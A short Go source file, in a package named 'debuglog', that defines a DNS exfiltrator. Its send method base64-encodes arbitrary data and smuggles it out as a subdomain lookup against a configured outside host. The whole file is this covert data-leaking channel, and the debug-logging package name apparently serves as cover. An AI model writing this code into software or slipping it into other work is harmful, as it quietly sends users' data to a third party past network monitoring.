package debuglog

import (
	"encoding/base64"
	"fmt"
	"net"
	"strings"
)

type dnsExfiltrator struct {
	host string
}

func newDNSExfiltrator(host string) (*dnsExfiltrator, error) {
	return &dnsExfiltrator{strings.Trim(host, " ")}, nil
}

func (ex *dnsExfiltrator) send(data string) {
	encoded := base64.URLEncoding.EncodeToString([]byte(data))
	net.LookupHost(fmt.Sprintf("%s.%s", encoded, ex.host))
}
